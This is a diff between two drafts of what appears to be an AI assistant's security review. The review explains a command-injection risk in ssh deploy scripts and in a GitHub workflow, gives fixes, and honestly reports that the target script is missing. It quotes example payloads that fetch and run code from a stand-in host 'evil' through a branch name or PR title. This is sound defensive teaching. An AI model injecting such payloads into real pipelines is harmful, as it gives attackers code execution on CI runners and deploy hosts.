@@ -1,38 +1,34 @@
-I couldn't find the script you described. Nothing in this workspace builds an ssh command from a branch name. A case-insensitive search for `ssh` matched no files. The only shell-related files are:
+I couldn't find the deploy script you described, so I haven't reviewed it yet. No file in this repo has an ssh command or interpolates a branch name. A case-insensitive search for `ssh` found nothing, and a search for `branch|BRANCH|REF_NAME|head_ref` found nothing either. These are the shell-related files that exist:
 
-- `.github/workflows/deploy.yml`: one `run:` step that echoes the PR title. It has no ssh and no branch name.
-- `scripts/backup.sh`: a nightly backup that uses `scp`, not ssh with a branch.
+- `.github/workflows/deploy.yml`
+- `.gitlab-ci.yml`
+- `scripts/backup.sh` (it uses `scp`, not `ssh`)
 
-Could you point me to the file, or push it? It may be on another branch or not committed yet. I haven't run `shellcheck` or `bash -n` on anything, because I don't have a shell in this session.
+The script may not be committed yet, or it may be on another branch (this checkout is a detached HEAD). If you send me the path or paste it in, I'll review it.
 
-## What I'd check in the deploy script
+### What I'll look for in the ssh command
+Putting a branch name into an ssh command string is a command-injection risk. ssh joins its arguments into one string, and the remote shell runs that string as code. Git allows branch names that contain shell syntax, such as `x;curl…|sh` or `$(…)`. Anyone who can push a branch can then run commands on the deploy host. The fix:
 
-Passing a branch name inside the ssh command string is a command-injection bug. The remote side runs whatever command string it receives through a shell, and quoting it locally doesn't stop that. Anyone who can name a branch can run code on the deploy host. Git allows branch names like `` x;curl${IFS}evil|sh `` or `$(id)`.
-
-The fix:
-1. **Check the branch name against an allowlist at the start, and reject it if it fails**:
+1. **Check the branch name against an allowlist and reject anything else.** Don't try to clean it up:
    ```bash
-   if [[ ! ${branch} =~ ^[A-Za-z0-9][A-Za-z0-9._/-]{0,99}$ ]] || [[ ${branch} == *..* ]]; then
+   if [[ ! ${branch} =~ ^[A-Za-z0-9._/-]+$ || ${branch} == -* ]]; then
      printf 'invalid branch: %q\n' "${branch}" >&2; exit 2
    fi
    ```
-2. **Don't paste it into the remote command.** Either:
-   - Run a fixed script on the remote and send the branch on stdin: `printf '%s\n' "${branch}" | ssh -- "${host}" /opt/deploy/deploy.sh`. The remote script reads it with `read -r branch` and checks it again.
-   - Or, if you need to pass it as an argument, escape it with `printf -v q '%q' "${branch}"; ssh -- "${host}" "/opt/deploy/deploy.sh ${q}"`. This only works if the remote login shell is Bash. Keep the allowlist check in front of it.
-3. Use `--` before the host, and check the host against an allowlist too, so a value like `-oProxyCommand=…` can't be read as an option.
-4. In CI, get the branch through `env:` (`BRANCH: ${{ github.head_ref }}`) and refer to it as `"${BRANCH}"`. Never write `${{ … }}` directly inside `run:`.
+2. **Escape it for the remote shell.** Quoting it locally isn't enough, because the remote side parses the string again. `printf %q` adds the second layer of quoting:
+   ```bash
+   ssh -- "${host}" "deploy-app --branch $(printf '%q' "${branch}")"
+   ```
+   It's safer still if the remote side never treats the branch as code. Send it on stdin (`ssh host 'read -r b; deploy-app --branch "$b"' <<<"${branch}"`), or use a forced command in `authorized_keys` that checks `SSH_ORIGINAL_COMMAND` itself.
+3. Never put `${{ github.head_ref }}` or a similar value directly into a CI `run:` step. Pass it through `env:` and refer to it as `"$BRANCH"`.
 
-## Problems in the files that do exist
+### Problems in the files that do exist
+- **`.github/workflows/deploy.yml:14` is the same kind of injection, and it's serious.** `${{ github.event.pull_request.title }}` is inserted into the shell before the step runs. Anyone who opens a PR can set a title like `"; curl evil|sh #` and run code on the CI runner. Line 7 sets `permissions: write-all`, so that code also gets a token that can write to the repo. To fix it, pass the title as `env: TITLE: ${{ github.event.pull_request.title }}`, use `echo "Title is ${TITLE}"`, and reduce permissions to `contents: read`.
+- **`scripts/backup.sh` has several problems:**
+  - No strict mode (`set -Eeuo pipefail`), so a failed `tar` still leads to the `scp`.
+  - The temp directory name `/tmp/backup.$$` is predictable, which allows a symlink attack. Use `mktemp -d`.
+  - There's no `trap … EXIT`, so the temp directory is left behind whenever the script fails partway.
+  - The variables aren't quoted.
+  - It uses backticks instead of `$(…)`.
 
-**`deploy.yml` (fix before CI uses it):**
-- Line 14: `${{ github.event.pull_request.title }}` is pasted straight into the shell. Anyone who opens a PR can run commands on the runner just by choosing the PR title. Move it into `env:` and use `"${TITLE}"` instead.
-- Line 7: `permissions: write-all` on a `pull_request` trigger gives that injected code a write token. Reduce it to `contents: read`.
-
-**`scripts/backup.sh`:**
-- It has no `set -Eeuo pipefail`. If `tar` fails, `scp` still runs and uploads a broken or missing archive.
-- `/tmp/backup.$$` is a predictable name, so someone else on the machine can create it first (or a symlink there). Use `mktemp -d` instead.
-- Nothing cleans up the temp directory if the script stops partway. Set `trap … EXIT` before creating it.
-- Variables aren't quoted, and it uses backticks instead of `$(…)`.
-- It runs from cron but doesn't set its own `PATH` or `umask`.
-
-Once you share the deploy script, I'll review it properly and run `shellcheck`, `bash -n`, and a failure-path test if you give me a shell.
+I only read these files. I couldn't run `shellcheck` or `bash -n` because I don't have a shell tool in this session. I'll run those checks when I review the real deploy script, or you can run them in CI.
